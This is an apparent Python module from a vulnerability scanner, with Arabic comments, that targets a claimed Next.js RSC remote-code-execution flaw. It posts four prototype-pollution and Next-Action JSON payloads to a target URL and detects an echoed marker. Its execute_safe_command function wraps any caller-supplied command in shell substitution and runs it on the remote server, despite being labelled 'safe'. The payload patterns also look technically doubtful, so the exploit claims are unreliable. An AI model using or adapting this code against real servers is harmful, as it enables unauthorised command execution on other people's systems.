# utils/verifier.py
"""
وظائف التحقق من ثغرة Next.js RSC RCE
تعتمد على أنماط استغلال حقيقية من تقارير أمنية
"""

import json
import requests
from typing import Tuple, Optional

def verify_rsc_rce(url: str, session: requests.Session, timeout: int = 12) -> Tuple[bool, str]:
    """
    التحقق من قابلية الاستغلال عبر إرسال أمر آمن وانتظار العلامة المميزة.
    
    Returns:
        (is_vulnerable: bool, output: str)
    """
    test_command = "echo VULNQ_RCE_CONFIRMED_7f3a9b"
    marker = "VULNQ_RCE_CONFIRMED_7f3a9b"
    
    # قائمة بأنماط الاستغلال المعروفة
    exploit_patterns = _get_exploit_patterns(test_command)
    
    for payload, headers in exploit_patterns:
        try:
            resp = session.post(
                url,
                data=payload,
                headers=headers,
                timeout=timeout
            )
            
            if marker in resp.text:
                # محاولة استخراج الناتج النظيف
                clean_output = _extract_output(resp.text, marker)
                return True, clean_output
                
        except requests.RequestException:
            continue
        except Exception:
            continue
            
    return False, "No exploitation pattern succeeded."

def _get_exploit_patterns(test_cmd: str) -> list:
    """توليد قائمة بالحمولات وأنماط الهجوم المعروفة."""
    patterns = []
    
    # === النمط 1: __proto__ pollution (شائع في Next.js <14.2.4) ===
    payload1 = {
        "__proto__": {
            "exec": "child_process.execSync",
            "args": [test_cmd]
        }
    }
    patterns.append((json.dumps(payload1), {"Content-Type": "application/json"}))
    
    # === النمط 2: action.constructor prototype pollution ===
    payload2 = {
        "id": "vulnquest_verify",
        "action": {
            "constructor": {
                "prototype": {
                    "exec": "child_process.execSync",
                    "args": [test_cmd]
                }
            }
        }
    }
    patterns.append((json.dumps(payload2), {"Content-Type": "application/json"}))
    
    # === النمط 3: مباشرة عبر body (لبعض الإعدادات غير الآمنة) ===
    payload3 = {
        "exec": "child_process.execSync",
        "args": [test_cmd]
    }
    patterns.append((json.dumps(payload3), {"Content-Type": "application/json"}))
    
    # === النمط 4: مع Next-Action header ===
    payload4 = {
        "id": "verify",
        "action": {
            "name": "execSync",
            "args": [test_cmd]
        }
    }
    patterns.append((
        json.dumps(payload4),
        {
            "Content-Type": "application/json",
            "Next-Action": "1"
        }
    ))
    
    return patterns

def _extract_output(response_text: str, marker: str) -> str:
    """استخراج الناتج من الاستجابة بعد العلامة المميزة."""
    try:
        start = response_text.find(marker)
        if start == -1:
            return response_text[:300]  # fallback
        
        # ابحث عن أول سطر بعد العلامة
        end_pos = response_text.find("\n", start)
        if end_pos == -1:
            end_pos = start + len(marker) + 200
            
        output = response_text[start + len(marker):end_pos].strip()
        return output if output else response_text[start:start+300]
        
    except Exception:
        return response_text[:300]

def execute_safe_command(url: str, session: requests.Session, command: str, timeout: int = 15) -> str:
    """
    تنفيذ أمر آمن (محدد مسبقًا) على الخادم المستهدف.
    يُستخدم في الوضع التفاعلي.
    """
    marker = "VULNQ_CMD_8e2c1d"
    full_cmd = f'echo "{marker}$({command} 2>&1)"'
    
    patterns = _get_exploit_patterns(full_cmd)
    
    for payload, headers in patterns:
        try:
            resp = session.post(url, data=payload, headers=headers, timeout=timeout)
            if marker in resp.text:
                clean = _extract_output(resp.text, marker)
                return clean if clean else "Command executed (no visible output)."
        except Exception:
            continue
            
    return "❌ Command execution failed. Target may not be vulnerable."